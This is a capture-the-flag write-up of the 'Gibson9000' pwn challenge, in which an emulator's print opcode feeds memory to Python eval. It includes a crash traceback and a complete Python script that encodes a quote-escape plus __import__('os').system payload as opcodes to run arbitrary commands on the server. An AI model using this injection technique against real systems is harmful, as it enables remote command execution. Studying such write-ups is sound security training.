# Gibson9000 - Pwn (100 + 0), 15 solves

> Can you program our new line of Gibson 9000 Calcumatron CPUs?

In this task we were given a short `README` file describing a custom computer architecture, and a `host:port`
running an emulator for the arch. The description hinted at possibility of the bug in the emulator 
("emulator was written by an intern").

The opcodes were as follows:
- `*x` - *dptr += x
- `+x` - dptr += x
- `_x` - some conditional jump, didn't need it
- `Xx` - print (zero-terminated?) string at dptr
- `Mx` - heat -= 1
- `Dx` - toggle debug

There was only limited RAM (128 bytes), so we immediately thought about the boundary conditions (what if dptr
goes over or under the range 0-127). It seems all of these were taken into account though. After 
an hour of sending random stuff, we managed to crash the emulator. The smallest reproducible example was
`*7*6X0`, which meant (ADD 7, ADD 6, print dptr). The emulator sends the following output:
```
Input your calculatory opcodez: *7*6X0
Result:
Traceback (most recent call last):
  File "/home/ctf/chal.py", line 129, in <module>
    dostep()
  File "/home/ctf/chal.py", line 104, in dostep
    print eval('"' + s + '"')
  File "<string>", line 1
    "
    ^
SyntaxError: EOL while scanning string literal
```

Looks like our string to be printed is evaluated? What the hell. The crash was because our string in this case was
`\r`, which may count as ending the line.

The path to solution is now obvious. Escape the sandbox via sending quote char, then some `__import__('os').system('ls')` or
whatever. This simple script allowed us to easily execute arbitrary commands on server:
```python
import sys

def build_char(c):
    c = ord(c)
    s = ""
    while c >= 7:
        s += "*7"
        s += "M0" * 7
        c -= 7
    s += "*%d" % c
    s += "M0" * 7
    s += "+1"
    s += "M0" * 7
    return s

total = ""
for c in '''"+__import__("os").system("%s")#''' % sys.argv[1]:
    total += build_char(c)
print total + "X0"
```
